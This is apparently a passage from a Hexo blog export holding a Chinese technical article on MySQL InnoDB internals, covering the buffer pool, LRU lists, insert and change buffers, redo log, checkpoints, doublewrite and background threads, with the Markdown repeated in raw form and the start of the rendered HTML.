重做日志缓冲\n\n重做日志是InnoDB引擎对其本身事务操作的日志记录，记录了关于每个页的更改的物理情况。重做日志的存在能够避免宕机造成数据的丢失。\n\n在InnoDB中，为了协调CPU与磁盘速度的鸿沟，页的操作首先都是在缓冲池中完成的。重做日志也一样，InnoDB引擎首先将重做日志信息放入到内存中（即重做日志缓冲），然后按一定频率将其刷新到重做日志文件。重做日志缓冲一般不需要设置太大，因为一般情况下每一秒中会将其刷新到重做日志文件，因此只需要保证每秒产生的事务量在这个缓冲大小之内即可（可通过`innodb_log_buffer_size`控制其大小，默认8MB）。重做日志文件会在三种情况下刷新到重做日志文件：\n\n1. 主线程每秒刷新一次\n2. 每个事务提交时，会将重做日志缓冲刷新到重做日志文件\n3. 当重做日志缓冲池剩余空间小于1/2时刷新\n\n当前事务数据库系统普遍采用Write Ahead Log策略，即当事务提交时，先写重做日志，再对页数据进行修改。因此当发生宕机而导致数据丢失时，可通过重做日志完成数据的恢复，当然未刷新到日志文件的重做日志（1秒以内）还是会有所丢失。\n\n**为什么需要重做日志**\n\n如果没有重做日志存在，将数据页刷新到硬盘都将直接操作数据文件，当从缓冲池将页的新版本刷新到硬盘时发生宕机，可能出现部分已写入部分未写入的情况，因为没有重做日志的存在，无法定位哪些页未写入。\n\n> 注意：重做日志文件的主要作用不是避免宕机造成的数据丢失，而是避免因宕机造成的数据文件的不完整。数据恢复只是不可靠的顺带的功能。BinLog文件才是真正为避免数据丢失而生的。\n\n### 3. 额外内存池\n\n在InnoDB存储引擎中，对内存的管理是通过内存堆的方式进行的。在对数据结构本身的内存进行分配时，需要从额外的内存池中进行申请，当该区域的内存不足时，会从缓冲池中申请。例如，分配了缓冲池，但是每个缓冲池中的帧缓冲还有对应的缓冲控制对象（Buffer Control Block），这些对象记录了一些注入LRU、锁、等待等信息，而这个对象的内存需要从额外内存池中申请。因此，当申请了很大的InnoDB缓冲池时，也应考虑相应地增加这个值。\n\n\n\n## 其他技术与特性\n\n### 1. CHECKPOINT技术\n\nCheckPoint（检查点）技术与前面说过的重做日志有密切地关系。重做日志是用于防止因宕机导致数据文件损坏，更改记录被刷新到硬盘后，这部分的日志便已经不再需要了，可以被覆盖。因此重做日志文件被设计成可以循环使用的，一般重做日志文件有两个（也可以设置成超过两个文件），循环使用这两个文件。\n\n要能使用重做日志来恢复数据，必须知道哪些版本数据已经刷入硬盘，哪些版本未刷入硬盘。基于此，就有了检查点（CheckPoint）技术。对于InnnoDB存储引擎而言，其是通过LSN（Log Sequence Number）来标记版本的，LSN是8字节地数字，其单位是字节。每个页有LSN，重做日志中也有LSN，CheckPoint也有LSN，CheckPoint前的数据都已经被刷入硬盘，通过比对CheckPoint的LSN和重做日志中的LSN便能知道哪些版本数据未刷入硬盘。\n\n在InnoDB中，CheckPoint发生的时间、条件、脏页的选择、刷新脏页的数量都非常复杂。CheckPoint的发生主要有以下几种：\n\n1. 数据库关闭时，将所有的脏页都刷回硬盘，这是默认都有的（`innodb_fast_shutdown=1`）\n2. 主线程每1秒、每10秒从缓冲池的列表中刷新一定比例的页回磁盘，这个过程是异步的\n3. InnoDB引擎需要保证LRU列表中有差不多100个空闲页可供使用，Cleaner线程会检测，如果没有则会将LRU列表尾端的页移除，如果这些页中有脏页（在`Flush列表`中），则会进行CheckPoint。（InnoDB1.2.X开始LRU可用页的数量默认值为1024，且可通过`innodb_lru_scan_depth`控制）\n4. 当重做日志文件达到`75% * total_redo_log_file_size`时（`total_redo_log_file_size`是所有重做日志文件的总大小），会执行阻塞发现问题的用户查询线程执行Async Flush CheckPoint；当重做日志文件达到`90% * total_redo_log_file_size`时，会阻塞所有用户查询线程执行Sync Flush CheckPoint。从InnoDB1.2.X开始，在Cleaner线程执行，不会阻塞用户查询线程\n5. 当缓冲池中脏页数量达到`innodb_max_dirty_page_pct`（默认75%）时，强制执行CheckPoint\n\n### 2. 刷新临接页\n\nInnoDB还存在了刷新临接页的特性：当刷新一个脏页时，InnoDB存储引擎会检测该页所在区的所有页，如果是脏页，那么一起刷新。可以由参数`innodb_flush_neighbors`来配置启用或关闭此特性（值0表示关闭）。\n\n### 3. 异步IO\n\nInnoDB采用异步IO（Asynchronous IO, AIO）的方式来处理磁盘操作，AIO的一个优势是可以对多个索引页进行并发扫描，另一个优势是可以进行IO Merge操作，将多个IO合并为一个IO，例如用户需要访问的页（space, page_no）为（8，6)、（8，7）、（8，8），每个页大小16KB，AIO会判断这三个页是连续的，AIO底层会发送一个IO请求，读取48KB的页。\n\n在InnoDB1.1.X之前，AIO实现是通过InnoDB引擎代码模拟实现，从InnoDB1.1.X开始，提供了内核级别的AIO支持，称为Native AIO，因此编译或允许该版本MySQL时需要libaio库的支持。Native AIO需要操作系统提供支持，Windows系统和Linux系统都提供Native AIO支持，而Mac OSX系统则未提供，只能依旧使用原模拟的方式。\n\n可以通过参数`innodb_use_native_aio`来控制启用Native AIO，Linux系统下默认启用（ON）。\n\n### 4. 两次写\n\n当数据库宕机时，可能InnoDB正在写入某个页到表中，而这个页只写了一部分，比如16KB的页，只写了前4KB，之后就发生了宕机，这种情况被称为部分写失效。有经验的DBA也许会想如果发生写失效，可以通过重做日志进行恢复。但实际上并不一定可以修复，页内数据有可能本身发生损坏（这与重做日志记录的内容有关，参考[mysql 为何需要Double Write？有redo log还不够吗？](<https://blog.csdn.net/jolly10/article/details/79791574>)，估计是因为重做日志在页内的记录与最终写入磁盘的并不是完全相同的，还会经过一次与底层结构相关的计算），需要先通过页的副本来还原页，再进行重做，这个副本就就是doublewrite的内容。\n\ndoublewrite由两部分组成，一部分是内存中的doublewrite buffer，大小为2MB，另一部分是物理磁盘上共享表空间中的连续的2个区（128个页，也是2MB）。在对缓冲区进行刷新时，并不直接写磁盘，而是会通过memcpy函数将页先复制到内存中的doublewrite buffer，之后通过doublewrite  buffer再分两次，每次1MB顺序地写入共享表空间的物理磁盘上，然后马上调用fsync函数，同步磁盘，避免缓冲带来的问题。由于doublewrite页是连续的，因此这个过程是顺序写的，开销并不是很大。在完成doublewrite页写入后，再将doublewrie buffer中的页写入各个表空间文件中，此时写入是离散的。\n\n参数`skip_innodb_doublewrite`可以禁止使用doublewrite功能，有些情况下，这是需要的，如：用户有多个从服务器（在从服务器上做的是RAID0），可以在从服务器上关闭doublewrite功能；有些文件系统（ZFS文件系统）本身提供了部分写失效的防范机制，就不用开启doublewrite功能。\n\n![图1](../static/MB20031501-6.png)\n\n## 后台线程\n\n### 1. Master线程\n\n负责将重做日志缓冲刷新到重做日志文件\n\n### 2. IO线程\n\nAsync IO，分为4种线程\n\n1. Read线程（默认4条线程，由`innodb_read_io_thread`参数控制）\n2. Write线程（默认4条线程，由`innodb_write_io_thread`参数控制）\n3. Insert Buffer线程（1条线程）\n4. Log线程（1条线程）\n\n### 3. Purge线程\n\n支持设置多个线程，由`innodb_purge_threads`控制\n\n负责任务UNDO页回收，`innodb_purge_batch_size`控制每次回收数量\n\n### 4. Cleaner线程\n\n负责将缓冲池中的脏页刷新到磁盘","source":"_posts/2020-03-15_Innodb_Struct.md","raw":"---\ntitle: 了解InnoDB体系架构\ndate: 2020-03-15 23:47:19\ntags: mysql\npermalink: innodb-struct\nkeywords: innodb, buffer\nrId: MB-20031501\n---\n\nInnoDB存储引擎具有行锁设计、支持事务、支持外键、支持MVCC、支持插入缓冲、支持自适应哈希索引等特点，其整体体系架构主要由后台线程、内存池、文件系统三部分组成，如下图所示：\n\n![图1](../static/MB20031501-1.png)\n\n接下来会针对后台线程和内存池展开介绍。\n\n## 内存池\n\n内存池从大的方面可以分为三块：重做日志缓冲（redo log buffer）、缓冲池（buffer pool）、额外内存池（additional memery pool）。缓冲池中缓存的数据页类型有：数据页（data page），索引页（index page）、插入缓冲（insert buffer）、锁信息（lock info）、自适应哈希索引（adaptive hash index）、数据字典（data dictionary）、undo页等。缓冲池从1.0.X版本开始，允许有多个实例，根据哈希值将每个页平均分配到不同的实例中。\n\n![图2](../static/MB20031501-2.png)\n\n### 1. 缓冲池\n\nInnodb是基于磁盘存储的数据库，CPU速度和磁盘速度之间存在巨大的鸿沟，磁盘速度较慢严重降低了数据库系统的性能。基于这个问题，数据库在内存中开辟了一块区域作为缓冲池来弥补两者之间的速度差距。在数据库中读取页时，首先将从磁盘读到的页放在缓冲池中，下次再读相同的页时，首先判断该页是否在缓冲池中，若命中则直接读取该页，否则从磁盘上读取。\n\n#### LRU列表\n\n缓冲池通过LRU（Latest Recent Used，最近使用）算法来进行管理页（数据页、索引页），最频繁使用的排在`LRU列表`前端，反之，排在末端。当缓冲池不能存放新读取到的页时，首先释放`LRU列表`末端的页。\n\nInnodb在LRU算法上做了一些调整。一些的一次性读取大量页的SQL操作会将缓冲池中的页大量刷出，从而影响缓冲池的效率（页缓冲池缓存频繁使用页的初衷不符）。为了解决这个问题，Innodb在LRU算法上引入了midpoint概念，midpoint点将`LRU列表`一分为二，`LRU列表`前端至midpoint点为`new列表`，midpoint点至`LRU列表`末端为`old列表`。`new列表`和`old列表`各自都以LRU算法管理，新读取的页被加入`old列表`，只有在`old列表`中存活一定时间(`innodb_old_blocks_time`)以后才会被加入`new列表`，可以看出`new列表`中的页都是最为活跃的热点数据。midpoint默认值是37%，即默认`old列表`占完整LRU列表的37%，由参数`innodb_old_blocks_pct`控制。\n\n![图3](../static/MB20031501-3.png)\n\n`LRU列表`中存储的页数上限是确定的，Innodb引入了`Free列表`来与`LRU列表`共同管理，未分配的页由`Free列表`进行管理，`Free列表`当前页数加`LRU列表`当前页数等于`LRU列表`可容纳的总页数。新读取页时，首先从`Free列表`中查找是否有空闲页，若有则将空闲页从`Free列表`移到`LRU列表`中，否则根据规则淘汰`LRU列表`末尾的页。\n\nInnoDB中页的大小是16KB，InnoDB从1.0.X开始，支持压缩页功能，可以将部分页压缩为1KB、2KB、4KB、8KB，对于非16KB的页，使用`unzip_LRU列表`管理。如需要申请4KB大小的页时，通过伙伴算法进行分配，过程如下：\n\n1. 检查4KB的`unzip_LRU列表`，检查是否有可用空闲页，若有则直接使用\n2. 检查8KB的`unzip_LRU列表`，若有空闲页，将页分成2个4KB页，存放到4KB的`unzip_LRU列表`\n3. 从`LRU列表`申请一个16KB的页，将页分成1个8KB的页和2个4KB的页，分别存放到对应的`unzip_LRU列表`中\n\n#### 脏页\n\n`LRU列表`中的页被修改后，该页称为脏页（dirty page），脏页既存在于`LRU列表`中又存在于`Flush列表`中，会通过`CheckPoint机制`被刷新会磁盘。\n\n#### 插入缓冲\n\n**插入缓冲主要是针对，插入操作时在非唯一的非聚集索引上进行离散插入会导致性能下降，这个问题设计的**。对于聚集索引，与数据的物理存储顺序是一致的，不用担心性能问题，但对于B+树结构下的非聚集索引这是需要考虑的问题。\n\n这里需要注意的两点是：\n\n1. 插入缓冲针对的是非聚集索引，不要因为名字就认为针对的是数据页\n2. 插入缓冲管辖的非聚集索引必须是非唯一的索引\n\nInnoDB存储引擎设计了Insert Buffer（插入缓冲），对于非聚集索引的插入或更新操作，不是每一次直接插入到索引页中，而是先判断插入的非聚集索引页是否在缓冲池中，若在则直接插入，否则先放入到Insert Buffer对象中，好似欺骗。之后主线程会异步地进行合并插入缓冲的工作，这样就大大提高了非聚集索引的插入效率。\n\nInsert Buffer的数据结构是一棵B+树，在MySQL4.1之前每张表有一棵B+树，而现在版本中全局只有一棵B+树，这棵B+树存放在共享表空间中，默认也就是`ibdata1文件`中。因此，试图通过独立表空间`.ibd文件`恢复表中数据时，往往会导致CHECK TABLE失败。这是因为表的辅助索引中的数据可能还在Insert Buffer中，所以通过`.ibd文件`进行恢复后，还需要进行REPAIR TABLE操作来重建表上所有的辅助索引。\n\n**B+树数据结构**\n\nInsert Buffer B+树非叶子节点存放的是查询的search key，其结构如下所示：space占用4字节，表示插入的表空间的id（InnoDB中每个表都有一个唯一的space id）；marker占用1字节，用于兼容老版本Insert Buffer；page_no占用4字节，表示页所在的偏移量\n\n![图4](../static/MB20031501-4.png)\n\nInsert Buffer B+树叶子节点的记录，结构如下图所示\n\n![图5](../static/MB20031501-5.png)\n\nspace、marker、page_no字段和非叶子节点中的含义相同，一共9个字节，metadata字段占用4个字节，存储内容如下\n\n|   名称   |  字节  |\n| :-----: | :----: |\n| IBUF_REC_OFFSET_COUNT| 2 |\n| IBUF_REC_OFFSET_TYPE | 1 |\n| IBUF_REC_OFFSET_FLAGS| 1 |\n\nIBUF_REC_OFFSET_COUNT用来排序每个记录进入Insert Buffer的顺序，因为Innodb从1.0.X开始支持Change Buffer，所以需要这个顺序回放才能得到记录的正确值。\n\n> 注：\n>\n> 1. IBUF_REC_OFFSET_TYPE和IBUF_REC_OFFSET_FLAGS暂时我也没理解清楚，可能与，后面的索引页类型有关\n> 2. 接下来关于Insert Buffer Bitmap这一块，我也没懂，仅做知识点记录，以后弄明白了再补充\n\n启用Insert Buffer索引后，辅助索引页(space, page_no)中的记录可能被插入到B+树中，为了保证每次Merge Insert Buffer页必须成功，还需要一个特殊的页用来标记每个辅助索引页的可用空间，这个页的类型是Insert Buffer Bitmap。\n\n每个Insert Buffer Bitmap页用来追踪16384个辅助索引页，即256个区（Extent）（所以一个区是64个页，一个区1MB ）。每个Insert Buffer Bitmap页都在16384个页的第二个页中。每个辅助索引页在Insert Buffer Bitmap页中占用4位(bit)，如下所示：\n\n| 名称             | 大小(bit) | 说明                                                         |\n| ---------------- | --------- | ------------------------------------------------------------ |\n| IBUF_BITMAP_FREE | 2         | 0 -> 无可用剩余空间<br />1 -> 剩余空间大于1/32页(512字节)<br />2 -> 剩余空间大于1/16页<br />3 -> 剩余空间大于1/8页 |\n| IBUF_BITMAP_BUFFERED | 1 |1表示辅助索引页有记录被缓存在Insert Buffer B+树中|\n| IBUF_BITMAP_IBUF | 1 |1表示该页位Insert Buffer B+树的索引页|\n>注：总结有以下几个没弄明白的点：\n>1.在硬盘上，辅助索引是如何划分页的，如何存储，随着数据的随机新增页的划分不会发生大范围的变化吗\n>2.Insert Buffer B+树叶子节点中的记录具体结构什么样（是单个索引记录还是整页记录）\n>3.Insert Buffer Bitmap在Insert Buffer B+树上吗，如何存在，它追踪16384个页数量的原因\n\n#### Change Buffer\n\nChange Buffer是InnoDB从1.0.X版本起引入的，可视为Insert Buffer的升级，可以对DML操作——INSERT、DELETE、UPDATE——都进行缓冲，分别是：Insert Buffer、Delete Buffer、Purge Buffer。\n\nUpdate操作分为两个步骤：\n\n1. 将记录标记为已删除——对应Delete Buffer\n2. 真正将记录删除——对应Purge Buffer\n\n#### UNDO页\n\n为了满足事务的原子性，在操作任何数据之前，首先将数据备份到一个地方（这个存储备份的地方称为Undo Log），然后进行数据的修改，这样在rollback时，可以利用Undo Log中备份的undo页将数据恢复到事务开始之前的状态。\n\n#### 自适应哈希索引\n\nInnoDB存储引擎会监控对表上各索引页的查询。如果观察到建立哈希索引可以带来速度提升，则建立哈希索引，称之为自适应哈希索引（Adaptive Hash Index, AHI）。AHI是通过缓冲池的B+数页构造而来的，因此建立速度很快，而且不需要对整张表构建哈希索引。InnoDB存储引擎会自动根据访问的频率和模式来自动地为某些热点页建立哈希索引。\n\nAHI有一个要求，即对这个页的连续访问模式必须是一样的。例如对于（a，b）这样的联合索引，其访问模式可以是以下情况：\n\n```sql\nWHERE a=xxx\nWHERE a=xxx AND b=xxxx\n```\n\n若交替进行上述两种查询，那么不会对该页构造AHI。另外，还有如下要求：\n\n1. 以该模式访问了100次\n2. 页通过该模式访问了N次，其中N=页中记录/16\n\n正如一般所知的哈希索引，自适应哈希索引也只能进行等值查询，范围查询是不能使用哈希索引的。\n\n默认自适应哈希索引是开启的，可以通过`innodb_adaptive_hash_index`来配置禁用或启动此特性。\n\n### 2. 重做日志缓冲\n\n重做日志是InnoDB引擎对其本身事务操作的日志记录，记录了关于每个页的更改的物理情况。重做日志的存在能够避免宕机造成数据的丢失。\n\n在InnoDB中，为了协调CPU与磁盘速度的鸿沟，页的操作首先都是在缓冲池中完成的。重做日志也一样，InnoDB引擎首先将重做日志信息放入到内存中（即重做日志缓冲），然后按一定频率将其刷新到重做日志文件。重做日志缓冲一般不需要设置太大，因为一般情况下每一秒中会将其刷新到重做日志文件，因此只需要保证每秒产生的事务量在这个缓冲大小之内即可（可通过`innodb_log_buffer_size`控制其大小，默认8MB）。重做日志文件会在三种情况下刷新到重做日志文件：\n\n1. 主线程每秒刷新一次\n2. 每个事务提交时，会将重做日志缓冲刷新到重做日志文件\n3. 当重做日志缓冲池剩余空间小于1/2时刷新\n\n当前事务数据库系统普遍采用Write Ahead Log策略，即当事务提交时，先写重做日志，再对页数据进行修改。因此当发生宕机而导致数据丢失时，可通过重做日志完成数据的恢复，当然未刷新到日志文件的重做日志（1秒以内）还是会有所丢失。\n\n**为什么需要重做日志**\n\n如果没有重做日志存在，将数据页刷新到硬盘都将直接操作数据文件，当从缓冲池将页的新版本刷新到硬盘时发生宕机，可能出现部分已写入部分未写入的情况，因为没有重做日志的存在，无法定位哪些页未写入。\n\n> 注意：重做日志文件的主要作用不是避免宕机造成的数据丢失，而是避免因宕机造成的数据文件的不完整。数据恢复只是不可靠的顺带的功能。BinLog文件才是真正为避免数据丢失而生的。\n\n### 3. 额外内存池\n\n在InnoDB存储引擎中，对内存的管理是通过内存堆的方式进行的。在对数据结构本身的内存进行分配时，需要从额外的内存池中进行申请，当该区域的内存不足时，会从缓冲池中申请。例如，分配了缓冲池，但是每个缓冲池中的帧缓冲还有对应的缓冲控制对象（Buffer Control Block），这些对象记录了一些注入LRU、锁、等待等信息，而这个对象的内存需要从额外内存池中申请。因此，当申请了很大的InnoDB缓冲池时，也应考虑相应地增加这个值。\n\n\n\n## 其他技术与特性\n\n### 1. CHECKPOINT技术\n\nCheckPoint（检查点）技术与前面说过的重做日志有密切地关系。重做日志是用于防止因宕机导致数据文件损坏，更改记录被刷新到硬盘后，这部分的日志便已经不再需要了，可以被覆盖。因此重做日志文件被设计成可以循环使用的，一般重做日志文件有两个（也可以设置成超过两个文件），循环使用这两个文件。\n\n要能使用重做日志来恢复数据，必须知道哪些版本数据已经刷入硬盘，哪些版本未刷入硬盘。基于此，就有了检查点（CheckPoint）技术。对于InnnoDB存储引擎而言，其是通过LSN（Log Sequence Number）来标记版本的，LSN是8字节地数字，其单位是字节。每个页有LSN，重做日志中也有LSN，CheckPoint也有LSN，CheckPoint前的数据都已经被刷入硬盘，通过比对CheckPoint的LSN和重做日志中的LSN便能知道哪些版本数据未刷入硬盘。\n\n在InnoDB中，CheckPoint发生的时间、条件、脏页的选择、刷新脏页的数量都非常复杂。CheckPoint的发生主要有以下几种：\n\n1. 数据库关闭时，将所有的脏页都刷回硬盘，这是默认都有的（`innodb_fast_shutdown=1`）\n2. 主线程每1秒、每10秒从缓冲池的列表中刷新一定比例的页回磁盘，这个过程是异步的\n3. InnoDB引擎需要保证LRU列表中有差不多100个空闲页可供使用，Cleaner线程会检测，如果没有则会将LRU列表尾端的页移除，如果这些页中有脏页（在`Flush列表`中），则会进行CheckPoint。（InnoDB1.2.X开始LRU可用页的数量默认值为1024，且可通过`innodb_lru_scan_depth`控制）\n4. 当重做日志文件达到`75% * total_redo_log_file_size`时（`total_redo_log_file_size`是所有重做日志文件的总大小），会执行阻塞发现问题的用户查询线程执行Async Flush CheckPoint；当重做日志文件达到`90% * total_redo_log_file_size`时，会阻塞所有用户查询线程执行Sync Flush CheckPoint。从InnoDB1.2.X开始，在Cleaner线程执行，不会阻塞用户查询线程\n5. 当缓冲池中脏页数量达到`innodb_max_dirty_page_pct`（默认75%）时，强制执行CheckPoint\n\n### 2. 刷新临接页\n\nInnoDB还存在了刷新临接页的特性：当刷新一个脏页时，InnoDB存储引擎会检测该页所在区的所有页，如果是脏页，那么一起刷新。可以由参数`innodb_flush_neighbors`来配置启用或关闭此特性（值0表示关闭）。\n\n### 3. 异步IO\n\nInnoDB采用异步IO（Asynchronous IO, AIO）的方式来处理磁盘操作，AIO的一个优势是可以对多个索引页进行并发扫描，另一个优势是可以进行IO Merge操作，将多个IO合并为一个IO，例如用户需要访问的页（space, page_no）为（8，6)、（8，7）、（8，8），每个页大小16KB，AIO会判断这三个页是连续的，AIO底层会发送一个IO请求，读取48KB的页。\n\n在InnoDB1.1.X之前，AIO实现是通过InnoDB引擎代码模拟实现，从InnoDB1.1.X开始，提供了内核级别的AIO支持，称为Native AIO，因此编译或允许该版本MySQL时需要libaio库的支持。Native AIO需要操作系统提供支持，Windows系统和Linux系统都提供Native AIO支持，而Mac OSX系统则未提供，只能依旧使用原模拟的方式。\n\n可以通过参数`innodb_use_native_aio`来控制启用Native AIO，Linux系统下默认启用（ON）。\n\n### 4. 两次写\n\n当数据库宕机时，可能InnoDB正在写入某个页到表中，而这个页只写了一部分，比如16KB的页，只写了前4KB，之后就发生了宕机，这种情况被称为部分写失效。有经验的DBA也许会想如果发生写失效，可以通过重做日志进行恢复。但实际上并不一定可以修复，页内数据有可能本身发生损坏（这与重做日志记录的内容有关，参考[mysql 为何需要Double Write？有redo log还不够吗？](<https://blog.csdn.net/jolly10/article/details/79791574>)，估计是因为重做日志在页内的记录与最终写入磁盘的并不是完全相同的，还会经过一次与底层结构相关的计算），需要先通过页的副本来还原页，再进行重做，这个副本就就是doublewrite的内容。\n\ndoublewrite由两部分组成，一部分是内存中的doublewrite buffer，大小为2MB，另一部分是物理磁盘上共享表空间中的连续的2个区（128个页，也是2MB）。在对缓冲区进行刷新时，并不直接写磁盘，而是会通过memcpy函数将页先复制到内存中的doublewrite buffer，之后通过doublewrite  buffer再分两次，每次1MB顺序地写入共享表空间的物理磁盘上，然后马上调用fsync函数，同步磁盘，避免缓冲带来的问题。由于doublewrite页是连续的，因此这个过程是顺序写的，开销并不是很大。在完成doublewrite页写入后，再将doublewrie buffer中的页写入各个表空间文件中，此时写入是离散的。\n\n参数`skip_innodb_doublewrite`可以禁止使用doublewrite功能，有些情况下，这是需要的，如：用户有多个从服务器（在从服务器上做的是RAID0），可以在从服务器上关闭doublewrite功能；有些文件系统（ZFS文件系统）本身提供了部分写失效的防范机制，就不用开启doublewrite功能。\n\n![图1](../static/MB20031501-6.png)\n\n## 后台线程\n\n### 1. Master线程\n\n负责将重做日志缓冲刷新到重做日志文件\n\n### 2. IO线程\n\nAsync IO，分为4种线程\n\n1. Read线程（默认4条线程，由`innodb_read_io_thread`参数控制）\n2. Write线程（默认4条线程，由`innodb_write_io_thread`参数控制）\n3. Insert Buffer线程（1条线程）\n4. Log线程（1条线程）\n\n### 3. Purge线程\n\n支持设置多个线程，由`innodb_purge_threads`控制\n\n负责任务UNDO页回收，`innodb_purge_batch_size`控制每次回收数量\n\n### 4. Cleaner线程\n\n负责将缓冲池中的脏页刷新到磁盘","slug":"innodb-struct","published":1,"updated":"2020-03-16T16:17:39.266Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7uob5os0001n4ukahwqxzcf","content":"<p>InnoDB存储引擎具有行锁设计、支持事务、支持外键、支持MVCC、支持插入缓冲、支持自适应哈希索引等特点，其整体体系架构主要由后台线程、内存池、文件系统三部分组成，如下图所示：</p>\n<p><img src=\"../static/MB20031501-1.png\" alt=\"图1\"></p>\n<p>接下来会针对后台线程和内存池展开介绍。</p>\n<h2 id=\"内存池\"><a href=\"#内存池\" class=\"headerlink\" title=\"内存池\"></a>内存池</h2><p>内存池从大的方面可以分为三块：重做日志缓冲（redo log buffer）、缓冲池（buffer pool）、额外内存池（additional memery pool）。缓冲池中缓存的数据页类型有：数据页（data page），索引页（index page）、插入缓冲（insert buffer）、锁信息（lock info）、自适应哈希索引（adaptive hash index）、数据字典（data dictionary）、undo页等。缓冲池从1.0.X版本开始，允许有多个实例，根据哈希值将每个页平均分配到不同的实例中。</p>\n<p><img src=\"../static/MB20031501-2.png\" alt=\"图2\"></p>\n<h3 id=\"1-缓冲池\"><a href=\"#1-缓冲池\" class=\"headerlink\" title=\"1. 缓冲池\"></a>1. 缓冲池</h3><p>Innodb是基于磁盘存储的数据库，CPU速度和磁盘速度之间存在巨大的鸿沟，磁盘速度较慢严重降低了数据库系统的性能。基于这个问题，数据库在内存中开辟了一块区域作为缓冲池来弥补两者之间的速度差距。在数据库中读取页时，首先将从磁盘读到的页放在缓冲池中，下次再读相同的页时，首先判断该页是否在缓冲池中，若命中则直接读取该页，否则从磁盘上读取。</p>\n<h4 id=\"LRU列表\"><a href=\"#LRU列表\" class=\"headerlink\" title=\"LRU列表\"></a>LRU列表</h4><p>缓冲池通过LRU（Latest Recent Used，最近使用）算法来进行管理页（数据页、索引页），最频繁使用的排在<code>LRU列表</code>前端，反之，排在末端。当缓冲池不能存放新读取到的页时，首先释放<code>LRU列表</code>末端的页。</p>\n<p>Innodb在LRU算法上做了一些调整。一些的一次性读取大量页的SQL操作会将缓冲池中的页大量刷出，从而影响缓冲池的效率（页缓冲池缓存频繁使用页的初衷不符）。为了解决这个问题，Innodb在LRU算法上引入了midpoint概念，midpoint点将<code>LRU列表</code>一分为二，<code>LRU列表</code>前端至midpoint点为<code>new列表</code>，midpoint点至<code>LRU列表</code>末端为<code>old列表</code>。<code>new列表</code>和<code>old列表</code>各自都以LRU算法管理，新读取的页被加入<code>old列表</code>，只有在<code>old列表</code>中存活一定时间(<code>innodb_old_blocks_time</code>)以后才会被加入<code>new列表</code>，可以看出<code>new列表</code>中的页都是最为活跃的热点数据。midpoint默认值是37%，即默认<code>old列表</code>占完整LRU列表的37%，由参数<code>innodb_old_blocks_pct</code>控制。</p>\n<p><img src=\"../static/MB20031501-3.png\" alt=\"图3\"></p>\n<p><code>LRU列表</code>中存储的页数上限是确定的，Innodb引入了<code>Free列表</code>来与<code>LRU列表</code>共同管理，未分配的页由<code>Free列表</code>进行管理，<code>Free列表</code>当前页数加<code>LRU列表</code>当前页数等于<code>LRU列表</code>可容纳的总页数。新读取页时，首先从<code>Free列表</code>中查找是否有空闲页，若有则将空闲页从<code>Free列表</code>移到<code>LRU列表</code>中，否则根据规则淘汰<code>LRU列表</code>末尾的页。</p>\n<p>InnoDB中页的大小是16KB，InnoDB从1.0.X开始，支持压缩页功能，可以将部分页压缩为1KB、2KB、4KB、8KB，对于非16KB的页，使用<code>unzip_LRU列表</code>管理。如需要申请4KB大小的页时，通过伙伴算法进行分配，过程如下：</p>\n<ol>\n<li>检查4KB的<code>unzip_LRU列表</code>，检查是否有可用空闲页，若有则直接使用</li>\n<li>检查8KB的<code>unzip_LRU列表</code>，若有空闲页，将页分成2个4KB页，存放到4KB的<code>unzip_LRU列表</code></li>\n<li>从<code>LRU列表</code>申请一个16KB的页，将页分成1个8KB的页和2个4KB的页，分别存放到对应的<code>unzip_LRU列表</code>中</li>\n</ol>\n<h4 id=\"脏页\"><a href=\"#脏页\" class=\"headerlink\" title=\"脏页\"></a>脏页</h4><p><code>LRU列表</code>中的页被修改后，该页称为脏页（dirty page），脏页既存在于<code>LRU列表</code>中又存在于<code>Flush列表</code>中，会通过<code>CheckPoint机制</code>被刷新会磁盘。</p>\n<h4 id=\"插入缓冲\"><a href=\"#插入缓冲\" class=\"headerlink\" title=\"插入缓冲\"></a>插入缓冲</h4><p><strong>插入缓冲主要是针对，插入操作时在非唯一的非聚集索引上进行离散插入会导致性能下降，这个问题设计的</strong>。对于聚集索引，与数据的物理存储顺序是一致的，不用担心性能问题，但对于B+树结构下的非聚集索引这是需要考虑的问题。</p>\n<p>这里需要注意的两点是：</p>\n<ol>\n<li>插入缓冲针对的是非聚集索引，不要因为名字就认为针对的是数据页</li>\n<li>插入缓冲管辖的非聚集索引必须是非唯一的索引</li>\n</ol>\n<p>InnoDB存储引擎设计了Insert Buffer（插入缓冲），对于非聚集索引的插入或更新操作，不是每一次直接插入到索引页中，而是先判断插入的非聚集索引页是否在缓冲池中，若在则直接插入，否则先放入到Insert Buffer对象中，好似欺骗。之后主线程会异步地进行合并插入缓冲的工作，这样就大大提高了非聚集索引的插入效率。</p>\n<p>Insert Buffer的数据结构是一棵B+树，在MySQL4.1之前每张表有一棵B+树，而现在版本中全局只有一棵B+树，这棵B+树存放在共享表空间中，默认也就是<code>ibdata1文件</code>中。因此，试图通过独立表空间<code>.ibd文件</code>恢复表中数据时，往往会导致CHECK TABLE失败。这是因为表的辅助索引中的数据可能还在Insert Buffer中，所以通过<code>.ibd文件</code>进行恢复后，还需要进行REPAIR TABLE操作来重建表上所有的辅助索引。</p>\n<p><strong>B+树数据结构</strong></p>\n<p>Insert Buffer B+树非叶子节点存放的是查询的search key，其结构如下所示：space占用4字节，表示插入的表空间的id（InnoDB中每个表都有一个唯一的space id）；marker占用1字节，用于兼容老版本Insert Buffer；page_no占用4字节，表示页所在的偏移量</p>\n<p><img src=\"../static/MB20031501-4.png\" alt=\"图4\"></p>\n<p>Insert Buffer B+树叶子节点的记录，结构如下图所示</p>\n<p><img src=\"../static/MB20031501-5.png\" alt=\"图5\"></p>\n<p>space、marker、page_no字段和非叶子节点中的含义相同，一共9个字节，metadata字段占用4个字节，存储内容如下</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">名称</th>\n<th align=\"center\">字节</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">IBUF_REC_OFFSET_COUNT</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">IBUF_REC_OFFSET_TYPE</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">IBUF_REC_OFFSET_FLAGS</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody></table>\n<p>IBUF_REC_OFFSET_COUNT用来排序每个记录进入Insert Buffer的顺序，因为Innodb从1.0.X开始支持Change 